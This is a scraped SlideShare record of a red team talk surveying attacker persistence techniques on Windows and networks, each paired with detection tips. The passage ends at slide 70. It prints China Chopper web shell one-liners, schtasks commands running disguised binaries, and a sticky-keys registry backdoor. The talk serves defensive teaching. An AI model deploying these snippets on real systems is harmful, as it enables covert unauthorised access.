{
    "id": "566bed21-afe5-4400-8fb9-9b7a7c5fbf22",
    "created_at": "2023-01-12T15:09:54.415749Z",
    "updated_at": "2025-03-27T02:16:58.683316Z",
    "deleted_at": null,
    "sha1_hash": "a4a3240beb2f89c79497766f4ba9049dd25f86cf",
    "title": "2016-04-16 - Ever Present Persistence - Established Footholds Seen in the Wild",
    "authors": "",
    "file_creation_date": "2022-05-29T00:54:09Z",
    "file_modification_date": "2022-05-29T00:54:09Z",
    "file_size": 1583543,
    "plain_text": "# Ever Present Persistence - Established Footholds Seen in the Wild\n\n**[slideshare.net/CTruncer/ever-present-persistence-established-footholds-seen-in-the-wild](http://www.slideshare.net/CTruncer/ever-present-persistence-established-footholds-seen-in-the-wild)**\n\nCTruncer\n\n4\n\nShare\n\n\n-----\n\nNext SlideShares\n\nUpcoming SlideShare\n\nThe Supporting Role of Antivirus Evasion while Persisting\n\n\n-----\n\nLoading in …3\n\n×\n\n1 of 101\n\n1 of 101\n\n4\n\nShare\n\nDownload to read offline\n\n[Technology](http://www.slideshare.net/featured/category/technology)\nThis talk is about different attacker persistence techniques that we have seen in the wild, or\npublished by other companies. We wanted to create a massive document containing all of\nthese techniques with a mile wide, inch deep approach. Our goal is to give a description of\nhow each technique works and a way to detect them to allow anyone to start looking for\nthese specific techniques.\n\n[CTruncer](http://www.slideshare.net/CTruncer?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideview)\nFollow\n\nThis talk is about different attacker persistence techniques that we have seen in the wild, or\npublished by other companies. We wanted to create a massive document containing all of\nthese techniques with a mile wide, inch deep approach. Our goal is to give a description of\nhow each technique works and a way to detect them to allow anyone to start looking for\nthese specific techniques.\n\n[Technology](http://www.slideshare.net/featured/category/technology)\n\n## More Related Content\n\n### Related Books\n\nFree with a 14 day trial from Scribd\n\n[See all](https://scribd.com/books)\n\n\n-----\n\nThe Future Is Faster Than You Think: How Converging Technologies Are Transforming\nBusiness, Industries, and Our Lives Peter H. Diamandis\n\n(4.5/5)\n\nFree\n\nTalk to Me: How Voice Computing Will Transform the Way We Live, Work, and Think James\nVlahos\n\n(4/5)\n\nFree\n\nSAM: One Robot, a Dozen Engineers, and the Race to Revolutionize the Way We Build\nJonathan Waldman\n\n\n-----\n\n(5/5)\n\nFree\n\nFrom Gutenberg to Google: The History of Our Future Tom Wheeler\n\n(3.5/5)\n\nFree\n\nSo You Want to Start a Podcast: Finding Your Voice, Telling Your Story, and Building a\nCommunity That Will Listen Kristen Meinzer\n\n(3.5/5)\n\nFree\n\n\n-----\n\nBezonomics: How Amazon Is Changing Our Lives and What the World s Best Companies\nAre Learning from It Brian Dumaine\n\n(4/5)\n\nFree\n\nNo Filter: The Inside Story of Instagram Sarah Frier\n\n(4.5/5)\n\nFree\n\nAutonomy: The Quest to Build the Driverless Car—And How It Will Reshape Our World\nLawrence D. Burns\n\n(5/5)\n\nFree\n\n\n-----\n\nFuture Presence: How Virtual Reality Is Changing Human Connection, Intimacy, and the\nLimits of Ordinary Life Peter Rubin\n\n(4/5)\n\nFree\n\nLive Work Work Work Die: A Journey into the Savage Heart of Silicon Valley Corey Pein\n\n(4.5/5)\n\nFree\n\nEverybody Lies: Big Data, New Data, and What the Internet Can Tell Us About Who We\nReally Are Seth Stephens-Davidowitz\n\n\n-----\n\n(4.5/5)\n\nFree\n\nLife After Google: The Fall of Big Data and the Rise of the Blockchain Economy George\nGilder\n\n(4/5)\n\nFree\n\nSystem Identification: Tutorials Presented at the 5th IFAC Symposium on Identification and\nSystem Parameter Estimation, F.R. Germany, September 1979 Elsevier Books Reference\n\n(4/5)\n\nFree\n\n\n-----\n\nEnergy Conservation in Buildings: The Achievement of 50% Energy Saving: An\nEnvironmental Challenge? Elsevier Books Reference\n\n(4/5)\n\nFree\n\nYoung Men and Fire: Twenty-fifth Anniversary Edition Norman Maclean\n\n(4.5/5)\n\nFree\n\nLongitude: The True Story of a Lone Genius Who Solved the Greatest Scientific Problem of\nHis Time Dava Sobel\n\n\n-----\n\n(4/5)\n\nFree\n\n### Related Audiobooks\n\nFree with a 14 day trial from Scribd\n\n[See all](https://scribd.com/audiobooks)\n\nIf Then: How the Simulmatics Corporation Invented the Future Jill Lepore\n\n(4.5/5)\n\nFree\n\nA Brief History of Motion: From the Wheel, to the Car, to What Comes Next Tom Standage\n\n(4/5)\n\nFree\n\nAn Ugly Truth: Inside Facebook’s Battle for Domination Sheera Frenkel\n\n(4.5/5)\n\n\n-----\n\nFree\n\nSpooked: The Trump Dossier, Black Cube, and the Rise of Private Spies Barry Meier\n\n(4/5)\n\nFree\n\nSecond Nature: Scenes from a World Remade Nathaniel Rich\n\n(5/5)\n\nFree\n\nDriven: The Race to Create the Autonomous Car Alex Davies\n\n(4.5/5)\n\nFree\n\n\n-----\n\nTest Gods: Virgin Galactic and the Making of a Modern Astronaut Nicholas Schmidle\n\n(5/5)\n\nFree\n\nEinstein's Fridge: How the Difference Between Hot and Cold Explains the Universe Paul Sen\n\n(4.5/5)\n\nFree\n\nDignity in a Digital Age: Making Tech Work for All of Us Ro Khanna\n\n(4/5)\n\nFree\n\n\n-----\n\nAfter Steve: How Apple Became a Trillion-Dollar Company and Lost its Soul Tripp Mickle\n\n(4.5/5)\n\nFree\n\nUser Friendly: How the Hidden Rules of Design Are Changing the Way We Live, Work, and\nPlay Cliff Kuang\n\n(4.5/5)\n\nFree\n\nBlockchain: The Next Everything Stephen P. Williams\n\n(4/5)\n\nFree\n\nUncanny Valley: A Memoir Anna Wiener\n\n(4/5)\n\nFree\n\n\n-----\n\nLean Out: The Truth About Women, Power, and the Workplace Marissa Orr\n\n(4.5/5)\n\nFree\n\nA World Without Work: Technology, Automation, and How We Should Respond Daniel\nSusskind\n\n(4.5/5)\n\nFree\n\nThe Players Ball: A Genius, a Con Man, and the Secret History of the Internet's Rise David\nKushner\n\n(4.5/5)\n\nFree\n\n1. 1. Ever Present Persistence - Established Footholds Seen in the Wild\n\n@evan_pena2003 @ChrisTruncer\n[2. 2. Whoami ● Evan Pena (@evan_pena2003) ○ Mandiant’s West Coast Red Team](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-2-638.jpg?cb=1460820675)\n\nFunctional Lead ○ Open Source Developer ■ ADEnumerator ■ NessusCombiner ■\nNMapParser, etc.\n\n\n-----\n\n[3. 3. Whoami ● Christopher Truncer (@ChrisTruncer) ○ Mandiant s Red Team ○ Florida](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-3-638.jpg?cb=1460820675)\n\nState Seminole ○ Open Source Developer ■ Veil Framework ■ Egress-Assess ■\nEyeWitness, etc\n[4. 4. What’s this talk about? ● Persistence ● Persisting Networks vs. Hosts ○ The Old](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-4-638.jpg?cb=1460820675)\n\nWays ○ New School ● What else is needed? ○ Application ○ Privilege Levels ● Detection\n[5. 5. Persistence](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-5-638.jpg?cb=1460820675)\n[6. 6. Persistence ● Main goal is continued access to a network, host, privilege level, or](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-6-638.jpg?cb=1460820675)\n\nwhatever. ● Persistence can overlap depending on your goal. E.g. persisting a host to\npersist a network.\n[7. 7. Persisting Hosts vs. Networks](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-7-638.jpg?cb=1460820675)\n[8. 8. Host Based ● We’re looking to have ad-hoc, or programmatically defined access to a](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-8-638.jpg?cb=1460820675)\n\nsystem as close to on-demand as possible. ● All efforts in this phase are restricted to\nthe individual system we are targeting.\n[9. 9. Host Based ● What do we need to be able to do? ○ Survive Reboots – the most](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-9-638.jpg?cb=1460820675)\n\nimportant aspect. ○ Compliment network based persistence. ○ Foothold into sensitive\nsystems.\n[10. 10. Network Based ● We’ve seen it used in two contexts: ○ Used to maintain access](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-10-638.jpg?cb=1460820675)\n\ninto a network ■ This is incredibly similar to host-based persistence, but could be\ncosidered network based for the intent it is used.\n[11. 11. Network Based ○ Used to maintain access to different network segments. ■ Don’t](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-11-638.jpg?cb=1460820675)\n\nwant to be VLANed off in a VOIP network.\n[12. 12. Network Based ● What do we want to do here? ○ Maintain persistence into unique](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-12-638.jpg?cb=1460820675)\n\nnetworks. ○ Access likely facilitated through host- based persistence.\n[13. 13. Persisting Networks](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-13-638.jpg?cb=1460820675)\n[14. 14. Web Shells ● Funny, this almost seems trivial and too easy that no one should use](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-14-638.jpg?cb=1460820675)\n\nit. ○ That is not the case ■ China Chopper - APT17, APT19, APT22 ■ ITSecShell,\nreDuh, ASPShell ■ Really, even just commodity code\n[15. 15. China Chopper ● Very tiny webshell, about 4 kb stored server-side. ● Can be in a](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-15-638.jpg?cb=1460820675)\n\nvariety of languages (cfm, asp, php, etc.) ● Uses a client application to interact with the\nwebshell\n[16. 16. China Chopper Server Code ● ASPX ○ <%@ Page Language=\"Jscript\"%><](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-16-638.jpg?cb=1460820675)\n\n%eval(Request.Item[\"password\"],\"unsafe\" );%> ● PHP ○ <?php\n@eval($_POST['password']);?> https://www.fireeye.com/blog/threatresearch/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html\n[17. 17. https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-17-638.jpg?cb=1460820675)\n\nchopper-web-shell-part-i.html\n[18. 18. China Chopper ● Pretty awesome features in it ○ File Explorer - including uploading](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-18-638.jpg?cb=1460820675)\n\nand downloading of files, mod of timestamp ○ Database Client - mssql, mysql\n\n  - Command Shell - normal ownage\n[19. 19. Web Shell Prevention/Detection ● Hunt for known bad files ○ Hashes, other file/text-](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-19-638.jpg?cb=1460820675)\n\nbased indicators ● Blacklist all filetypes except expected files for upload functionality\n\n  - Don’t allow your web server to execute files uploaded from untrusted sources\n\n\n-----\n\n[20. 20. Magic Packet ● Or, how to access port 12345 with a packet to port 443 ●](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-20-638.jpg?cb=1460820675)\n\nAttacker’s problem: ○ Compromised a web server (ports 80 and 443 are occupied)\n[21. 21. Magic Packet ○ Firewalls prevent connections to any other port ○ Wants a TCP](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-21-638.jpg?cb=1460820675)\n\nbackdoor to be remotely accessible ■ Can’t be bothered to write a web shell\n[22. 22. Magic Packet - Creative Solution ● Run backdoor, listening on 12345 ● Run](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-22-638.jpg?cb=1460820675)\n\nmalware “low” in the network stack that will: ○ Check incoming TCP SYN packets ○\nWhen a SYN packet contains a specific signature, change the destination port from\n443 to 12345\n[23. 23. Magic Packet - Creative Solution ○ Windows network stack will deliver the packet](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-23-638.jpg?cb=1460820675)\n\nto backdoor ○ Malware alters the port in all subsequent packets for that TCP stream\n[24. 24. Magic Packet – Creative Solution Syn, dport: 443 data=s3cr37Malware Syn, dport:](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-24-638.jpg?cb=1460820675)\n\n12345 SynAck sport: 12345 SynAck sport: 443 12345 Compromised System 443\n[25. 25. Outlook ● Outlook rules can help provide a really unique way to gain access to a](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-25-638.jpg?cb=1460820675)\n\nsystem. ● Silent Break wrote a post on leveraging outlook rules to gain access to a\nuser’s system. ○ Focused on access, but can be used for persistence too :)\nh\"ps://silentbreaksecurity.com/malicious-outlook-rules/\n[26. 26. Outlook ● Create a modified Outlook rule to execute a binary when the trigger](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-26-638.jpg?cb=1460820675)\n\nsubject is received. ● Sync the rule against target user account. ● Send e-mail that\ntriggers the rule. ● Get shell :)\n[27. 27. https://silentbreaksecurity.com/wp-content/uploads/2015-10-14_13-45-16.jpg](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-27-638.jpg?cb=1460820675)\n[28. 28. Outlook ● Additional tweaks ○ Have it auto-delete the e-mail when it arrives to](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-28-638.jpg?cb=1460820675)\n\nprevent detection from the user/victim ● https://silentbreaksecurity.com/maliciousoutlook-rules/\n[29. 29. Outlook ● Detection: ○ Casey Smith – Link for searching server- side rules ○](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-29-638.jpg?cb=1460820675)\n\nhttps://blogs.msdn.microsoft.com/canberrapfe/2012/11/05/ever-needed-to-find-serverside-outlook-rules-that-forward- mail-outside-of-your-organisation/ ○ Main IOC is a rule\nset to execute a binary when a certain event happens.\n[30. 30. Through Credentials?](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-30-638.jpg?cb=1460820675)\n[31. 31. Persisting Hosts The Old Way](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-31-638.jpg?cb=1460820675)\n[32. 32. Registry Hacks ● Probably the 101 method of host based persistence. ● Really](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-32-638.jpg?cb=1460820675)\n\neasy to setup, and can be configured from varying levels of permissions. ● Can be\nused to compliment new ways.\n[33. 33. Registry Hacks ● You can configure it to run when the machine starts, or when a](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-33-638.jpg?cb=1460820675)\n\nuser logs into the machine. ○ HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun\n\n  - HKCUSOFTWAREMicrosoftWindowsCurrentVersionRun ● These methods are also\nhighly publicized and are the first thing most defensive tools look for.\n[34. 34. Registry Hacks ● Can be good for helping to solidify initial access, but I wouldn’t](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-34-638.jpg?cb=1460820675)\n\nuse them for long term persistence. ○ Hopefully most teams should have the ability to\ndetect these and therefore shouldn’t be relied on.\n[35. 35. Startup Folder ● Startup folder will execute all files in the folder. ○](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-35-638.jpg?cb=1460820675)\n\nC:ProgramDataMicrosoftWindowsStart MenuProgramsStartup\n\n\n-----\n\n[36. 36. Scheduled Tasks ● Scheduled tasks are a fairly easy way for a user of any level to](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-36-638.jpg?cb=1460820675)\n\npersist a system. ● If you have the proper permissions, you can schedule up to\nSYSTEM level tasks. ● This is Microsoft’s recommendation/ alternative to stop using\nAT.\n[37. 37. Scheduled Tasks ● Scheduled tasks can be created from the command line with](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-37-638.jpg?cb=1460820675)\n\nschtasks.exe or GUI. ● These can run on system startup, when a user logs into the\nsystem, after the system has been idle, etc. ● This can run binaries, powershell one\nliners, or others.\n[38. 38. Scheduled Tasks ● schtasks /create /tn SysUpdate /sc onidle /i 15 /tr](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-38-638.jpg?cb=1460820675)\n\nc:userschrisdownloads safe.exe ● schtasks /create /tn WinUpdate /sc onstart /ru\nSystem /tr c: totallylegit.exe /s winsqldbsystem\nh\"p://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-oneliners/\n[39. 39. Scheduled Tasks Detection ● Get a baseline of the different tasks set to run on a](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-39-638.jpg?cb=1460820675)\n\nsystem ○ schtasks /query ○ Look in the Task Scheduler ○ Scheduled task log analysis\n\n  - Periodically audit systems to identify deviations\n[40. 40. Service Manipulation ● Services typically run with SYSTEM level permissions, so](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-40-638.jpg?cb=1460820675)\n\nthey are a great candidate to target. ● Easiest way to install a service based\npersistence (if not admin) is to check for write permissions to existing services.\n[41. 41. http://www.harmj0y.net/blog/tag/powerup/](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-41-638.jpg?cb=1460820675)\n[42. 42. Service Manipulation ● :) Now that targets have found, you need a malicious](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-42-638.jpg?cb=1460820675)\n\nservice binary. ○ Veil-Evasion, PowerUp, custom code, etc. ● Save off the original\nservice, and then replace it with your malicious binary. ● Bounce the box (if required).\n[43. 43. Sticky Keys ● With administrative access to a machine, you can easily setup sticky](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-43-638.jpg?cb=1460820675)\n\nkeys. ○ Make a copy of sethc.exe ○ Copy cmd.exe to C:windows system32sethc.exe\n\n  - Reboot, and hit shift 5 times!\n[44. 44. Sticky Keys ● Another method, setting cmd.exe as the Debugger for sethc.exe. ○](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-44-638.jpg?cb=1460820675)\n\nREG ADD \"HKLMSOFTWAREMicrosoftWindows NT CurrentVersionImage File\nExecution Options sethc.exe\" /v Debugger /t REG_SZ /d \"C:windows\nsystem32cmd.exe\" h\"p://carnal0wnage.a\"ackresearch.com/2012/04/privilegeescalaAon-via-sAcky-keys.html?\nshowComment=1335891005473#c7632690272609583721\n[45. 45. Sticky Keys ● Main problem, is it doesn’t require authentication. ○ If using a shell](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-45-638.jpg?cb=1460820675)\n\n  - So if this is used, ensure that you use a callback that only connects to you, etc.\n[46. 46. Sticky Keys ● Detection: ○ Compare the sethc.exe binary hash with the known good](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-46-638.jpg?cb=1460820675)\n\nsethc.exe ○ Ensure sethc.exe doesn’t have a debugger setup that triggers a different\nbinary.\n[47. 47. Persisting New School](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-47-638.jpg?cb=1460820675)\n[48. 48. DLL Search Order Hijack ● Search order hijacking exploits how Windows searches](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-48-638.jpg?cb=1460820675)\n\nfor dlls when loading an executable. ○ Specifically, it exploits the fact that Windows will\nsearch the same folder the binary is stored in for a dll first*\n\n\n-----\n\n[49. 49. DLL Search Order Hijack ● Old sample in CAPEC ○ If you drop ntshrui.dll within](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-49-638.jpg?cb=1460820675)\n\nC:Windows and run explorer.exe, you can get the dll within C:Windows to be executed\n\n  - This exploits the order in which the dll is searched for on a Windows system\n[50. 50. DLL Search Order Hijack ● Attackers create malicious DLLs that exploit this search](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-50-638.jpg?cb=1460820675)\n\norder to get their DLL to run on a system. ● Since it’s every time the application runs, it\ncan be used as a persistence technique. ● PowerUp can be used to find these\nopportunities\n[51. 51. DLL Search Order Hijack ● Used by the following actors ○ APT 1, APT 8, APT 17,](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-51-638.jpg?cb=1460820675)\n\nAPT 19, APT 22, APT 26 ● Used by the following malware ○ AMISHARP, GH0ST,\nHOMEUNIX, POISON IVY, VIPER\n[52. 52. Legit Scheduled Tasks ● Easy to identify scheduled tasks named “evilTask” or](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-52-638.jpg?cb=1460820675)\n\nanomalous tasks ● First we must look at how investigators detect malicious scheduled\ntasks:\n[53. 53. Legit Scheduled Tasks ○ Stacking tasks accross multiple systems to determine](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-53-638.jpg?cb=1460820675)\n\nanomalous tasks ○ Parse task scheduler log (schedLgu.txt)\n[54. 54. Legit Scheduled Tasks ● What if we modify existing legit scheduled tasks? ○](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-54-638.jpg?cb=1460820675)\n\nSpecifically tasks that are not required for Windows functionality\n[55. 55. Unquoted Service Path ● Unquoted service paths exploit a vulnerability in the order](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-55-638.jpg?cb=1460820675)\n\nthat Windows searches for a binary when a space is in an unquoted path. ○ C:Program\nFiles(x86)SteamSteam Gamingsteam.exe\n[56. 56. Unquoted Service Path ● C:Program Files(x86)SteamSteam Gamingsteam.exe](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-56-638.jpg?cb=1460820675)\n\n  - C:Program.exe ○ C:Program Files(x86)SteamSteam.exe ○ C:Program\nFiles(x86)SteamSteam Gamingsteam.exe ● We have three opportunities here!\n[57. 57. Unquoted Service Path ● If we have write access to any of the paths that Windows](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-57-638.jpg?cb=1460820675)\n\nlooks for, we can hijack the service. ○ Just need a service binary again (J) ● Drop it into\nany of the paths on the previous slide, and restart the service! ○ Might have to wait for a\nrestart\n[58. 58. Unquoted Service Path ● Prevention ○ Check service binaries on your images and](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-58-638.jpg?cb=1460820675)\n\ndetermine if any are using unquoted service paths. ○ Make sure the paths aren’t\nwritable to non-admins. ○ PowerUp can find these as well\n[59. 59. WMI ● Three requirements necessary to invoke a permanent WMI event](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-59-638.jpg?cb=1460820675)\n\nsubscriber: 1. An Event Filter 2. An Event Consumer 3. A Filter/Consumer Binding\nOriginal research performed by Matt Graeber released in “Practical Persistence with\nPowerShell” presentation\n[60. 60. Event Filters ● The WMI query that fires upon an event occurring - usually, an event](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-60-638.jpg?cb=1460820675)\n\nclass derived from __InstanceModificationEvent, __InstanceCreationEvent, or\n__InstanceDeletionEvent Original research performed by Matt Graeber released in\n“Practical Persistence with PowerShell” presentation\n[61. 61. Event Consumers Original research performed by Matt Graeber released in](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-61-638.jpg?cb=1460820675)\n\n“Practical Persistence with PowerShell” presentation ● There are five different types of\nEvent consumers ● We’re specifically interested in the “CommandLineEventConsumer”\n\n\n-----\n\n[62. 62. Filter/Consumer Binding ● This associates the event filter with the event consumer](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-62-638.jpg?cb=1460820675)\n\nOriginal research performed by Matt Graeber released in “Practical Persistence with\nPowerShell” presentation\n[63. 63. WMI ● PowerSploit’s Persistence Module for WMI ○ Automates the process ○ Will](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-63-638.jpg?cb=1460820675)\n\ncreate a permanent WMI event subscription ● Can use Out-EncodedCommand (in\nPowerSploit) to get one liner\n[64. 64. PowerShell Profiles ● Use standard persistence mechanism to execute PowerShell](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-64-638.jpg?cb=1460820675)\n\nsilently ○ \"C:Windows System32WindowsPowerShell v1.0powershell.exe\" NonInteractive - WindowStyle Hidden ○ It’s a legit exe!\n[65. 65. Example](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-65-638.jpg?cb=1460820675)\n[66. 66. PowerShell Profiles ● Anytime PowerShell executes, it will execute code in the](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-66-638.jpg?cb=1460820675)\n\ndefault profile. ● Create profile here ○ C:Windows System32WindowsPowerShell\nv1.0profile.ps1\n[67. 67. Security Support Provider ● A security support provider (SSP) - like a security](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-67-638.jpg?cb=1460820675)\n\npackage ○ A user-mode secuirty extension used to perform authentication during a\nclient/server exchange. Original research performed by Matt Graeber released at\nMIRcon 2014\n[68. 68. Security Support Provider ● An authentication package (AP) ○ Used to extend](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-68-638.jpg?cb=1460820675)\n\ninteractive login authentication ○ Example: Enable RSA token authentication Original\nresearch performed by Matt Graeber released at MIRcon 2014\n[69. 69. Security Support Provider ● SSP/AP ○ Can serve tasks of SSPs and APs. loaded](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-69-638.jpg?cb=1460820675)\n\ninto lsass at boot. ○ Example: Kerberos and msv1_0 (NTLM) Original research\nperformed by Matt Graeber released at MIRcon 2014\n[70. 70. Security Support Provider ● You can install your own SSP that will be loaded 